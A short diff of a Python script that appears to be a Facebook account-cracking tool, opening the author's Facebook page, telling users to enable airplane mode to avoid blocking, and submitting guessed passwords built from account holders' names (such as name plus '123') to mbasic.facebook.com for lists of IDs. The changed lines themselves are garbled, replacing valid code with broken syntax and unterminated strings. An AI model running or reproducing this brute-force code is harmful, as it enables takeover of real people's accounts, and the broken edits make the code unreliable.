@@ -248,7 +248,7 @@ class __xxx__:
             os.system("clear")
         elif chi in ('3', '03'):
          	os.system('xdg-open https://www.facebook.com/FB.KING.MAHIN.NAME.TOH.SONSO')
-            print(logo)
+            prin """"
             print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
             print(47*"-")
             print('\033[1;37m Total IDs : %s ' % len(self.id))
@@ -264,7 +264,7 @@ class __xxx__:
                         else:
                             pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                             pwx = ["786110"]
-                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com""""
                     except:
                         pass
             hasil(ok,cp)
